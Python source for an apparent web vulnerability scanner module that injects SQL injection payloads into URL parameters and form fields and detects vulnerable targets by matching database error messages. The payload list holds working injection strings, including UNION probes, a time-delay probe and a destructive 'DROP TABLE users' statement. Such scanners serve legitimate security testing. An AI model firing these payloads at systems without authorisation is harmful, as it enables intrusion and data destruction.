import logging
from urllib.parse import urlparse, parse_qs, quote
from ..http_client import HttpClient
import re
from typing import List, Dict, Optional, Union
from .base_scanner import BaseScanner

logger = logging.getLogger(__name__)

class SQLiScanner(BaseScanner):
    def __init__(self, client=None):
        super().__init__(client)
        self.payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1 --",
            '" OR "" = "',
            "') OR ('1'='1--",
            "1; DROP TABLE users--",
            "1' WAITFOR DELAY '0:0:10'--",
            "1 OR 1=1",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
        ]
        self.error_patterns = [
            r"SQL syntax",
            r"MySQL server",
            r"ORA-[0-9]+",
            r"syntax error",
            r"unclosed quotation",
            r"JDBC exception",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Microsoft SQL Native Client error",
            r"OLE DB.*SQL Server",
            r"SQL Server.*Driver",
            r"Warning.*odbc_.*",
            r"Warning.*mssql_",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine",
            r"Syntax error.*in query expression",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"SQL Server.*Driver.*Error",
            r"SQL Server.*Driver.*Warning",
            r"SQL Server.*Driver.*Exception",
            r"SQL Server.*Driver.*Fatal",
            r"SQL Server.*Driver.*Critical",
            r"SQL Server.*Driver.*Severe",
            r"SQL Server.*Driver.*Error.*[0-9]+",
            r"SQL Server.*Driver.*Warning.*[0-9]+",
            r"SQL Server.*Driver.*Exception.*[0-9]+",
            r"SQL Server.*Driver.*Fatal.*[0-9]+",
            r"SQL Server.*Driver.*Critical.*[0-9]+",
            r"SQL Server.*Driver.*Severe.*[0-9]+"
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        vulnerabilities = []
        
        try:
            # Check URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                for param in params:
                    for payload in self.payloads:
                        try:
                            test_url = self._inject_payload(url, param, payload)
                            response = self.client.get(test_url, timeout=10)
                            
                            if response and self._is_vulnerable(response.text):
                                vulnerabilities.append({
                                    'type': 'SQL Injection',
                                    'url': test_url,
                                    'payload': payload,
                                    'evidence': self._extract_error(response.text),
                                    'severity': 'critical',
                                    'param': param,
                                    'method': 'GET'
                                })
                        except Exception as e:
                            logger.error(f"SQLi GET scan error for {url}: {str(e)}")
            
            # Check forms
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        for field in form_fields:
                            for payload in self.payloads:
                                try:
                                    test_data = {}
                                    for f in form_fields:
                                        field_name = f.get('name') if isinstance(f, dict) else f
                                        test_data[field_name] = payload if f == field else 'test'
                                    
                                    if method == 'POST':
                                        response = self.client.post(action, data=test_data, timeout=10)
                                    elif method == 'GET':
                                        response = self.client.get(action, params=test_data, timeout=10)
                                    else:
                                        logger.warning(f"Unsupported form method: {method}")
                                        continue
                                    
                                    if response and self._is_vulnerable(response.text):
                                        vulnerabilities.append({
                                            'type': 'SQL Injection',
                                            'url': action,
                                            'payload': payload,
                                            'evidence': self._extract_error(response.text),
                                            'severity': 'critical',
                                            'param': field,
                                            'method': method
                                        })
                                except Exception as e:
                                    logger.error(f"SQLi form scan error for field {field}: {str(e)}")
                    except Exception as e:
                        logger.error(f"SQLi form scan error: {str(e)}")
        
        except Exception as e:
            logger.error(f"SQLi scan error: {str(e)}")
        
        return vulnerabilities

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _is_vulnerable(self, response_text: str) -> bool:
        return any(re.search(pattern, response_text, re.IGNORECASE) for pattern in self.error_patterns)

    def _extract_error(self, text: str) -> str:
        for pattern in self.error_patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return f"SQL error detected: {match.group(0)}"
        return "Unknown SQL error"